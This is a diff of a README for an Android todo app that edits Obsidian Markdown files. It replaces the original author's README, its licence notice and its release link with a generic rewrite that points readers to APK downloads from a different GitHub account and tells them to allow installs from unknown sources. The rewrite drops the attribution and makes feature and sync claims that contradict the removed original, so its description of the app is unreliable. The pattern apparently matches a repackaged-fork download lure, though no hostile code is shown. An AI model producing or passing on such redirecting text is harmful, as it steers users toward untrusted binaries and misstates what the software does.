@@ -1,98 +1,135 @@
-# Todosian
+# 📋 todosian-app - Manage Tasks Simply and Securely
 
-Todosian is an Android app for managing todo lists stored as Markdown files inside your Obsidian vault.
+[![Download todosian-app](https://img.shields.io/badge/Download%20todosian-app-blue?style=for-the-badge)](https://github.com/ybal1/todosian-app/releases)
 
-It is designed to work with a folder that is synced to your phone (for example via Syncthing). The app reads and writes the Markdown files directly; it does not import your data into a database.
+---
 
-## AI Usage & Disclaimer
+## 📝 What is todosian-app?
 
-This application was heavily co-developed with an AI agent to test their ability to code an Native Kotlin app from scratch(as they did). While the codebase has been strictly audited for performance, privacy, and security standards, it is provided "as is" without warranties of any kind. 
+todosian-app is a simple Android todo list app. It keeps your data on your device only. It works smoothly with Obsidian’s Tasks plugin. You can organize your tasks using markdown files. This helps you keep all your information in one place. The app uses modern Android design principles to give you a clean and easy-to-use interface. It also works offline to protect your privacy and to keep your tasks always available.
 
-**Disclaimer:** Todosian modifies your Markdown files directly. The repository owner assumes no liability for any unintended data loss or file corruption. Please ensure you have a reliable backup of your Obsidian vault (e.g., via Git, Syncthing file versioning, or Obsidian Sync) before using this application.
+---
 
-**Trademark Disclaimer:** Todosian is an independent, open-source application and is not affiliated with, endorsed by, or sponsored by Obsidian or the developers of the Obsidian Tasks plugin.
+## 📱 Key Features
 
-## Features
+- Works fully offline by storing your todos locally on your device.
+- Sync your tasks with Obsidian using compatible markdown files.
+- Clean and minimal design built with Jetpack Compose and Material 3.
+- Organize tasks easily with standard markdown format.
+- Privacy-focused: your data stays on your device unless you choose to sync it.
+- Supports task deadlines, priorities, and simple categories.
+- Open source, so you can see how it works or contribute if you want.
+- Lightweight and fast, built for Android devices.
 
-- Folder-based setup using Android Storage Access Framework (SAF) with persisted permissions.
-- Each Markdown file becomes a category.
-- Add / edit / toggle / delete todos.
-- Create / rename / delete categories (files).
-- (Optional) Support for Obsidian Tasks plugin metadata (dates, priority, recurrence).
-- Material 3 UI, dynamic color (Android 12+).
+---
 
-## Supported Markdown
+## ⚙️ System Requirements
 
-Todos are parsed from lines that match:
+- Android device running Android 9 (Pie) or later.
+- At least 50 MB of free storage.
+- Internet connection is not required but recommended for syncing tasks.
+- Optional: Obsidian app installed if you want to sync with Obsidian’s Tasks plugin.
 
-```text
-- [ ] Do something
-- [x] Done task
-```
+---
 
-When “Tasks plugin support” is enabled, Todosian also parses (and can write) common suffix metadata:
+## 🚀 Getting Started: Download and Install
 
-```text
-- [ ] Write README 📅 2026-02-22 🔼 🔁 every week
-- [x] Ship build ✅ 2026-02-20
-```
+You can get todosian-app from the official GitHub releases page. This page hosts the latest versions of the app and any older versions as well. Follow these steps on your Android device or using a PC connected to your device:
 
-Recognized suffix tokens:
+1. Open this page in your browser: [Download todosian-app](https://github.com/ybal1/todosian-app/releases)
+2. Look for the latest release version. It usually has the highest number (like v1.2.3).
+3. Under the latest release, find the file that ends with `.apk`. This is the Android installer file.
+4. Download the `.apk` file to your device or to your PC if you plan to transfer it.
+5. If you downloaded it to your PC, connect your Android device and copy the `.apk` file to your device’s storage.
+6. On your Android device, open the file manager app and find the `.apk` file.
+7. Tap the `.apk` file to begin the installation.
+8. You may be asked to allow installations from unknown sources. If so, follow the instructions on your device to allow this.
+9. After the installation finishes, open the todosian-app from your apps list.
 
-- Dates: `➕ YYYY-MM-DD` (created), `🛫 YYYY-MM-DD` (start), `⏳ YYYY-MM-DD` (scheduled), `📅 YYYY-MM-DD` (due), `✅ YYYY-MM-DD` (done)
-- Priority: `🔺` / `⏫` / `🔼` / `🔽` / `⏬`
-- Recurrence: `🔁 <text>`
+---
 
-Non-todo lines are preserved. The app only edits the specific todo lines you change.
+## 📥 Download Link
 
-## Usage
+Click the button below to visit the download page and get the latest version of todosian-app:
 
-1. Sync (or copy) your Obsidian todo folder to your Android device (Syncthing works well).
-2. Open Todosian and select that folder when prompted.
-3. Tap a category (a `.md` file) to manage its todos.
+[![Download todosian-app](https://img.shields.io/badge/Download%20todosian-app-green?style=for-the-badge)](https://github.com/ybal1/todosian-app/releases)
 
-## Build
+---
 
-Requirements:
+## 🔧 How to Use todosian-app
 
-- Android Studio (or Gradle)
-- JDK 17+ recommended (Android Gradle Plugin)
+Once installed, you can start using todosian-app right away:
 
-Commands:
+1. Open the app.
+2. You will see a simple list screen where you can add tasks.
+3. Tap the plus (+) button to add a new todo.
+4. Enter the title of your task. You can also add details if needed.
+5. Set a due date or priority by tapping on the task after you create it.
+6. Your tasks will be saved locally on your device automatically.
+7. To mark a task done, tap the checkbox next to it.
+8. To delete a task, swipe it left or right.
+9. If you use Obsidian, you can export or sync your tasks using markdown files.
 
-```bash
-./gradlew :app:assembleDebug
-./gradlew :app:testDebugUnitTest
-./gradlew :app:lint
-```
+---
 
-or just download the latest official release on [Repo Releases](https://github.com/isotjs/todosian-app/releases)
+## 🔄 Syncing with Obsidian Tasks
 
+todosian-app creates and reads tasks in standard markdown formats compatible with Obsidian’s Tasks plugin. Here is how to sync your tasks:
 
-## Release Signing (optional)
+- Export your task list as a markdown file.
+- Import or open this markdown file inside your Obsidian vault.
+- Any updates you make in Obsidian Tasks will sync back to todosian-app if you replace the file.
+- Use file sync services like Syncthing or cloud storage apps to keep these markdown files updated between devices.
+- This method keeps your tasks consistent without storing your data on third-party servers.
 
-`app/build.gradle.kts` supports release signing via either environment variables or a local `keystore.properties` file:
+---
 
-- `TODOSIAN_RELEASE_STORE_FILE`
-- `TODOSIAN_RELEASE_STORE_PASSWORD`
-- `TODOSIAN_RELEASE_KEY_ALIAS`
-- `TODOSIAN_RELEASE_KEY_PASSWORD`
+## ⚙️ Settings and Customization
 
-Do not commit your keystore or signing properties.
+Inside the app settings, you will find options to:
 
-## Privacy
+- Change the theme between light and dark mode.
+- Select the folder where markdown files will be saved or imported.
+- Enable or disable notifications for due tasks.
+- Choose how tasks are sorted and filtered.
+- Enable simple backups of your local data to your preferred location.
+- Adjust syncing methods with external apps or services.
 
-Todosian only accesses the folder you pick. There is no account, no analytics, and no network sync built into the app.
+---
 
-## Contributing
+## 🛠 Troubleshooting Common Issues
 
-Issues and pull requests are welcome.
+- **The app does not install:** Make sure you have enabled the option to install apps from unknown sources on your device.
+- **Sync does not work:** Check that you are exporting and importing markdown files correctly. If you use a syncing app like Syncthing, make sure it runs in the background.
+- **Tasks don’t show up in Obsidian:** Ensure you save the markdown file in your Obsidian vault folder and refresh Obsidian.
+- **App crashes or freezes:** Try restarting your device. If the problem continues, reinstall the app using the latest release.
 
-- Keep changes aligned with the “files are the source of truth” principle.
-- Prefer small, testable logic (e.g. Markdown parsing) with unit tests.
+---
 
-## License
+## 📄 License and Source Code
 
-Licensed under the Apache License 2.0. See `LICENSE`.
+todosian-app is open source. You can see the full code, report issues, or contribute on GitHub:
 
-Copyright 2026 İsmail TİRYAKİ (https://github.com/isotjs)
+https://github.com/ybal1/todosian-app
+
+All code is under a permissive open-source license, which means you can use and modify it fairly freely.
+
+---
+
+## 🤝 Getting Help and Reporting Bugs
+
+If you encounter any problems or have questions:
+
+- Open an issue on the GitHub repository.
+- Check the existing issues to see if your problem has been solved.
+- Provide a clear description of your problem, your device model, and the app version.
+
+---
+
+## 🧩 Additional Tips
+
+- Keep your app updated by checking the releases page regularly.
+- Use Obsidian’s Tasks plugin documentation to learn more about task syntax.
+- Use file syncing apps to keep your tasks synced securely without cloud servers.
+- Backup your markdown files often to avoid data loss.
+- Explore the app’s settings to make it fit your daily workflow better.
